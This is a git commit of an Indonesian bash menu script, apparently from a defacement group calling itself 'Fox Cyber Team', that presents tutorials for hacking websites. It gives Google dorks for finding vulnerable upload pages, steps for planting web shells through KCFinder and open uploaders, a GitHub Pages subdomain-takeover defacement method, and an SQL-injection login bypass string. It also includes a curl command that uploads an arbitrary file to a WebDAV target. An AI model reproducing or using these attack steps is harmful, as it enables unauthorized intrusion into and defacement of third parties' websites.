0d47ffbbba6d3d56b5a8a1f2b545c01eef8278a7
Kedut21 <41323725+Kedut21@users.noreply.github.com>
2018-11-19 12:18:43 +0700

    Add files via upload

---
+++ kes.sh
@@ -0,0 +1,333 @@
+#!/bin/bash
+#version 1.0 "
+#mau ngapain 
+#mau recorded?
+#gk bakal bikin lu pro
+#kontol
+echo "_____________________________________________________________"
+echo •  "Tools    : KHESA TAMVAN $white         " |lolcat
+echo •  "Creadby  : Fox Cyber Team $white   " |lolcat
+echo •  "Contact  : 082297538971 $white " |lolcat
+echo  "_____________________________________________________________"
+echo " "
+echo "==========>TUTORIAL DEFACE<========== " |lolcat
+sleep 1
+echo -o "1.DEFACE KCFINDER";
+echo "{•}================================={•} "  |lolcat
+sleep 1
+echo -o "2.DEFACE DORKING UPLOADER";
+echo "{•}================================={•} "  |lolcat
+sleep 1
+echo -o "3.Deface Subdomain TakeOver With Github";
+echo "{•}================================={•} "  |lolcat
+sleep 1
+echo -o "4.Deface Poc Bypass admin";
+echo "{•}================================={•} "  |lolcat
+sleep 3
+echo "==========>DEFACE WEB<========== " | lolcat
+sleep 1
+echo -o "5.Fox Webdav";
+echo "{•}================================={•} "  |lolcat
+sleep 1
+echo -o "6.Sqlmap";
+echo "{•}================================={•} "  |lolcat
+sleep 3
+echo "==========>CARA MEMBUAT SC<========== " |lolcat
+sleep 1
+echo -o "7.LITESCRIPT";
+echo "{•}================================={•} "  |lolcat
+sleep 1
+echo "==========>FOX CYBER<========== " |lolcat
+echo -o "99.info";
+echo "{•}================================={•} "  |lolcat
+sleep 1
+echo -o "100.exit";
+echo " "
+read -p "Tools@F-Tools:~#" command
+if [ $command -eq 1 ];
+	then
+clear
+sleep 2
+echo -e "_____________________________________________________________" $blue |lolcat
+echo •  "Tools    : KHESA TAMVAN $white         " |lolcat
+echo •  "Creadby  : Fox Cyber Team $white   " |lolcat
+echo •  "Contact  : 082297538971 $white " |lolcat
+echo •   "TUTORIAL POC KCFINDER" |lolcat
+echo -e  "_____________________________________________________________" $blue |lolcat
+echo " "
+echo "•Bahan Bahan " |lolcat
+echo " "
+sleep 1
+echo "1.hp/pc "
+sleep 1
+echo "2.Dork:-inurl:/uploads/haber "
+echo        "-inurl:/uploads/haber site:tr "
+sleep 1
+echo "3.Csrf Online "
+sleep 1
+echo "4.Exploit:/panel/kcfinder/upload.php "
+echo "Contoh:http://site.com/panel/kcfinder/upload.php "
+sleep 2
+echo "5.Shell ext .php5 dan sc hacked by kalian "
+sleep 2
+echo " "
+echo "+++++++++++++++++++++++++++++++" |lolcat
+echo "•Langkah Langkah " |lolcat
+echo " "
+sleep 1
+echo "1.Seperti Biasa Dorking Di google  "
+sleep 2
+echo "2.Cari Web Terus masukan Exploit  "
+echo "jika Eror Berarti vuln "
+sleep 2
+echo "3.Masuk Ke csrf online "
+sleep 2
+echo "4.Kunci Target...Upload shell kalian "
+sleep 2
+echo "5.done "
+sleep 1 
+echo "Cara akses? site.co.li/panel/kcfinder/upload/files/namashel.php5 "
+echo " "
+sleep 2
+echo "Khesa Gans " |lolcat
+fi
+if [ $command -eq 2 ];
+	then
+clear
+echo -e "_____________________________________________________________" $blue |lolcat
+echo •  "Tools    : KHESA TAMVAN $white         " |lolcat
+echo •  "Creadby  : Fox Cyber Team $white   " |lolcat
+echo •  "Contact  : 082297538971 $white " |lolcat
+echo •   "TUTORIAL POC DORKING UPLOADER" |lolcat
+echo -e  "_____________________________________________________________" $blue |lolcat
+echo "•Bahan Bahan " |lolcat
+echo " "
+echo "1.hp/pc "
+sleep 1
+echo "2.Dork:-Inurl:up.php intext:Upload Site:co.il "
+echo "-intext:index of upload.phtml "
+echo "-intext:index of uploader.php.fla "
+sleep 3
+echo "3.shell bakdor/sc "
+sleep 2
+echo "4.KEGANTENGAN KAYA GW "
+sleep 2
+echo " "
+echo "+++++++++++++++++++++++++++++++" |lolcat
+echo "•Langkah Langkah " | lolcat
+echo " "
+sleep 1
+echo "1.Pertama Kita Dorking Menggunakan dork di atas "
+sleep 2
+echo "2.cari target yang ada file uploader/pokoknya berbau uploader "
+sleep 3
+echo "3.Jika ada silakan upload shell bakdor kalian..Jika gagal use ur brain bypass ekstense/temper data "
+sleep 4
+echo "5.cara aksesnya?-www.site.com/[path]/shell.php atau "
+echo "www.site.com/shell.php "
+sleep 3
+echo " "
+echo "Khesa Gans " |lolcat
+fi
+if [ $command -eq 3 ];
+	then
+clear
+echo -e "_____________________________________________________________" $blue |lolcat
+echo •  "Tools    : KHESA TAMVAN $white         " |lolcat
+echo •  "Creadby  : Fox Cyber Team $white   " |lolcat
+echo •  "Contact  : 082297538971 $white " |lolcat
+echo •   "TUTORUIAL Deface Subdomain TakeOver With Github" |lolcat
+echo -e  "_____________________________________________________________" $blue |lolcat
+echo "•Bahan Bahan " |lolcat
+echo " "
+sleep 1
+echo "1.Akun Github "
+sleep 1
+echo "2.domain github : grab.github.io "
+sleep 2
+echo "3.reverse IP onlen cek this out⬇⬇⬇ "
+echo "https://hackertarget.com/reverse-ip-lookup "
+sleep 3
+echo "4.HTTP status checker:http://httpstatus.io "
+sleep 2
+echo " "
+echo "++++++++++++++++++++++++++++++++"
+echo "•Langkah Langkah " |lolcat
+echo " "
+sleep 1
+echo "1.Masuk Ke Akun Github lu "
+sleep 2
+echo "2.pergi ke reverse IP lookup "
+sleep 2
+echo "3.Masukin Url grab.github.io "
+sleep 2
+echo "4.nanti disitu banyak dns web web "
+sleep 2
+echo "5.langsung pergi ke http status checker "
+sleep 2
+echo "6.salin DNS DNS tadi , maximal 100 domain "
+echo "Kenapa harus di cek? Karna ga semua domain statusnya 404 "
+sleep 4
+echo "7.cari status domain yang 404 "
+sleep 2
+echo "8.lalu masuk ke akun github "
+sleep 2
+echo "9.klik tanda + di pojok kanan atas , lalu klik New repository "
+sleep 2
+echo "10.Repository Name nya lu isi pake nama domain web yang vuln "
+echo "Gak usah Make Https:// "
+sleep 3
+echo "11.centang tulisan Initialize this Repository with ReadME "
+sleep 2
+echo "12.jika udah langsung klik create new Repository "
+sleep 2
+echo "13.Lalu kalian klik  create new file,nama filenya kalian isi index.html "
+sleep 3
+echo "14.lalu isinya kalian isi script heked by kalian :'v awoakwowk "
+sleep 2
+echo "15.jika sudah klik tombol hijaunya "
+sleep 2
+echo "16.selanjutnya masuk ke menu settings ,bukan settings akun github lu"
+sleep 3
+echo "17.isi REPOSITORY NAME nya dengan nama domain target kalean "
+sleep 2
+echo "18.scroll ke bawah sampai ada tulisan github pages "
+sleep 2
+echo "19.kalian cari bacaan 'None' lalu kalian ganti dengan 'master Branch' klik save "
+sleep 3
+echo "20.lalu custom domainnya kalian isi dengan domain target kalian juga "
+sleep 3
+echo "21.Kemudian klik save,jika sukses muncul tulisan'your site is published at http://targetlu.co.li/' "
+sleep 3
+echo "22.kemudian cek target lu...done :') "
+sleep 2
+echo "SEKIAN TUTORNYA BANYAK BANGET YA WKWKWK "
+sleep 3
+echo " "
+echo "Khesa Gans " |lolcat
+fi
+if [ $command -eq 4 ];
+	then
+clear
+echo -e "_____________________________________________________________" $blue |lolcat
+echo •  "Tools    : KHESA TAMVAN $white         " |lolcat
+echo •  "Creadby  : Fox Cyber Team $white   " |lolcat
+echo •  "Contact  : 082297538971 $white " |lolcat
+echo •   "TUTORIAL DEFACE BYPASS ADMIN" |lolcat
+echo -e  "_____________________________________________________________" $blue |lolcat
+sleep 1
+echo • "•Bahan Bahan   " |lolcat
+sleep 1
+echo " "
+echo "1.Hp/Pc " |lolcat
+sleep 1
+echo "2.Kouta Insternet " |lolcat
+sleep 1
+echo "3.dork:-inurl:/admin site:in " |lolcat
+echo        "-inurl:/admin site:in " |lolcat
+echo        "-inurl:/panel/index.php " |lolcat
+echo • "kembangin lagi dorknya sesuai otak vokep lu." |lolcat
+sleep 3
+echo "4.Shell BaKdor/Sc " |lolcat
+sleep 1
+echo "5.Pasword:'=''or' " |lolcat
+sleep 1
+echo "6.Ke Sabaran " |lolcat
+echo " "
+echo "+++++++++++++++++++++++++++++++++++++++++++++++" |lolcat
+sleep 2
+echo • "•Langkah Langkah " |lolcat
+sleep 1
+echo " "
+echo "1.Searcing dork ke google " |lolcat
+sleep 2
+echo "2.Cari Web Yang Vuln" |lolcat
+sleep 2
+echo "3.Masukan password:'=''or ke id dan pw" |lolcat
+sleep 2
+echo "4.jika vuln maka anda akan masuk Ke Web Target anda" |lolcat
+sleep 3
+echo "5.Cari Tempat upload " |lolcat
+sleep 2
+echo "6.Upload Shell/Sc Hacked by kalian wkwkw " |lolcat
+sleep 2
+echo "Selsai " |lolcat
+sleep 1
+echo " "
+sleep 5
+echo "Khesa Ganssss" |lolcat $blue
+fi
+if [ $command -eq 5 ];
+	then
+clear
+sleep 2
+figlet FWebdav
+sleep 1
+read -p "Nama Script : " script
+echo " "
+sleep 1
+read -p "Web Vuln : " web
+sleep 2
+curl -T /storage/emulated/0/$script $web
+sleep 2
+echo " "
+echo "Keterangan : "
+echo "Jika blank berarti sukses"
+sleep 1
+echo "Jika muncul eror gagal"
+sleep 
+fi
+if [ $command -eq 6 ];
+	then
+apt install python2
+apt install git
+git clone https://github.com/sqlmapproject/sqlmap
+cd sqlmap
+Python2 sqlmap.py
+fi
+if [ $command -eq 7 ];
+	then
+pkg install python2
+pkg install git
+git clone https://github.com/4L13199/LITESCRIPT
+cd LITESCRIPT
+python2 LITESCRIPT.py
+fi
+if [ $command -eq 99 ];
+	then
+sleep 1
+echo "Thanks To All Member Fox Cyber"
+sleep 1
+echo "./Fx-Anonyfunk"
+sleep 1
+echo "./Fx-Roboski"
+sleep 1
+echo "./Fx-Ms 4D3V"
+sleep 1
+echo "./Fx-73R54K171"
+sleep 1
+echo "./Fx-Mr CL4�0"
+sleep 1
+echo "./Fx-Chuliex"
+sleep 1
+echo "./Fx-BL4KC4TD34D"
+sleep 1
+echo "./Fx-K3DU7"
+sleep 1
+echo "./Fx-FoxAnon"
+sleep 1
+echo "./Fx-sultan"
+sleep 1
+echo "./Fx-mr.1C3CR34M"
+sleep 1
+echo "./Fx-kididi04"
+sleep 1
+echo "Al member old Fox Cyber"
+sleep 3
+sh Kes.sh
+fi
+if [ $command -eq 100 ];
+	then
+echo "Terima Kasih Sudah Menggunakan Tools Kami"
+sleep 1
+fi
